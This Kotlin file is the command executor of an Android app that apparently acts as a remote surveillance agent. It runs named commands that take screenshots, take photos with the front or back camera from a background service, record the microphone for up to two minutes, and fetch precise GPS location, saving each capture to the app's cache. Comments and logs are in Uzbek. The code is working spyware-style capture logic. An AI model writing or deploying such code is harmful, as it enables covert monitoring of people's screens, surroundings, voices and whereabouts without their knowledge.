package org.hullas.agent

import android.content.Context
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.location.Location
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationTokenSource
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class CommandExecutor(private val ctx: Context) {
    private val tag = "CommandExecutor"
    private val cacheDir: File get() = ctx.cacheDir

    suspend fun execute(cmd: Command): Result<File?> {
        return try {
            when (cmd.cmd) {
                "screenshot" -> Result.success(takeScreenshot())
                "cam_back", "photo" -> Result.success(takePhoto(CameraSelector.LENS_FACING_BACK))
                "cam_front" -> Result.success(takePhoto(CameraSelector.LENS_FACING_FRONT))
                "record" -> {
                    val dur = cmd.args.optInt("duration", 10).coerceIn(5, 120)
                    Result.success(recordAudio(dur))
                }
                "location" -> Result.failure(LocationException(getLocation()))
                else -> Result.failure(Exception("Noma'lum buyruq: ${cmd.cmd}"))
            }
        } catch (e: Exception) {
            Log.e(tag, "Execute xato: ${cmd.cmd}", e)
            Result.failure(e)
        }
    }

    private fun takeScreenshot(): File? {
        val projection = ScreenshotHolder.projection ?: return null
        val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(metrics)
        val w = metrics.widthPixels
        val h = metrics.heightPixels
        val density = metrics.densityDpi

        val reader = android.media.ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
        var display: VirtualDisplay? = null
        try {
            display = projection.createVirtualDisplay(
                "hullas_cap", w, h, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.surface, null, null,
            )
            Thread.sleep(300)
            val image = reader.acquireLatestImage() ?: return null
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * w
            val bmp = Bitmap.createBitmap(
                w + rowPadding / pixelStride, h, Bitmap.Config.ARGB_8888,
            )
            bmp.copyPixelsFromBuffer(buffer)
            image.close()
            val cropped = Bitmap.createBitmap(bmp, 0, 0, w, h)
            val file = File(cacheDir, "screenshot_${System.currentTimeMillis()}.png")
            FileOutputStream(file).use { cropped.compress(Bitmap.CompressFormat.PNG, 90, it) }
            bmp.recycle()
            cropped.recycle()
            return file
        } finally {
            display?.release()
            reader.close()
        }
    }

    private suspend fun takePhoto(lens: Int): File? = suspendCoroutine { cont ->
        val file = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
        val future = ProcessCameraProvider.getInstance(ctx)
        future.addListener({
            try {
                val provider = future.get()
                val capture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()
                provider.unbindAll()
                val selector = CameraSelector.Builder().requireLensFacing(lens).build()
                // Service context — ProcessCameraProvider needs lifecycle; use fake via activity
                // Fallback: use ImageCapture with a workaround via SetupActivity lifecycle holder
                val lifecycle = ServiceLifecycleOwner
                provider.bindToLifecycle(lifecycle, selector, capture)
                capture.takePicture(
                    ImageCapture.OutputFileOptions.Builder(file).build(),
                    ContextCompat.getMainExecutor(ctx),
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                            provider.unbindAll()
                            cont.resume(file)
                        }
                        override fun onError(exc: ImageCaptureException) {
                            provider.unbindAll()
                            Log.e(tag, "Kamera xato", exc)
                            cont.resume(null)
                        }
                    },
                )
            } catch (e: Exception) {
                Log.e(tag, "Kamera setup xato", e)
                cont.resume(null)
            }
        }, ContextCompat.getMainExecutor(ctx))
    }

    private fun recordAudio(seconds: Int): File? {
        val file = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(ctx)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }
        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setAudioSamplingRate(44100)
            recorder.setAudioEncodingBitRate(128000)
            recorder.setOutputFile(file.absolutePath)
            recorder.prepare()
            recorder.start()
            Thread.sleep(seconds * 1000L)
            recorder.stop()
            return if (file.exists() && file.length() > 0) file else null
        } catch (e: Exception) {
            Log.e(tag, "Audio xato", e)
            return null
        } finally {
            try {
                recorder.release()
            } catch (_: Exception) {
            }
        }
    }

    private fun getLocation(): Pair<Double, Double>? {
        val client = LocationServices.getFusedLocationProviderClient(ctx)
        val latch = CountDownLatch(1)
        var loc: Location? = null
        val cts = CancellationTokenSource()
        client.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, cts.token)
            .addOnSuccessListener { location ->
                loc = location
                latch.countDown()
            }
            .addOnFailureListener {
                client.lastLocation.addOnSuccessListener { last ->
                    loc = last
                    latch.countDown()
                }.addOnFailureListener { latch.countDown() }
            }
        latch.await(15, TimeUnit.SECONDS)
        val l = loc ?: return null
        return Pair(l.latitude, l.longitude)
    }
}

class LocationException(val coords: Pair<Double, Double>?) : Exception(
    if (coords != null) "location_ok" else "Lokatsiya olinmadi",
)